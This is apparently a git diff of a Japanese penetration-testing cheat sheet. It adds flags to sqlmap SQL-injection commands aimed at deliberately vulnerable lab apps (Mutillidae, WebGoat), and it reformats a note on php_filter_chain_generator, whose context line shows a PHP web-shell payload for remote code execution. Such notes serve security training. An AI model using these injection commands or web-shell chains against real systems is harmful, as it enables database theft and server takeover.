@@ -111,7 +111,7 @@ ping <ip> -c 3
 ### URL にパラメータが含まれる例
 
 ```shell
-sqlmap -u "http://192.168.11.12/mutillidae/index.php?page=user-info.php&username=aaa&password=bbb&user-info-php-submit-button=View+Account+Details" -p username --schema
+sqlmap -u "http://192.168.11.12/mutillidae/index.php?page=user-info.php&username=aaa&password=bbb&user-info-php-submit-button=View+Account+Details" -p username --schema --sql-query --parse-errors --exclude-sysdbs
 ```
 
 ### POST データにパラメータが含まれる例
@@ -123,6 +123,7 @@ sqlmap -u "http://192.168.11.12/WebGoat/attack?Screen=71&menu=1100" \
 --cookie "acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=iaml1rtui5cfcjvsrc504g0t6; JSESSIONID=FEA4D26D5A2B7C42D53D2216D29D7B3" \
 --header "Authorization: Basic d2ViZ29hdDp3WJnb2F0" \
 --level 1 --risk 1 \
+--sql-query --parse-errors --exclude-sysdbs \
 -p "password"
 ```
 
@@ -199,9 +200,10 @@ echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/
 ```
 
 #### php_filter_chain_generator
+
 https://github.com/synacktiv/php_filter_chain_generator
 
-require か include のパラメータを渡せるとき、ファイルアップロードも、dataスキームも使わずにRCEが可能になるという天才過ぎるツール。
+require か include のパラメータを渡せるとき、ファイルアップロードも、data スキームも使わずに RCE が可能になるという天才過ぎるツール。
 
 ```shell
 python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
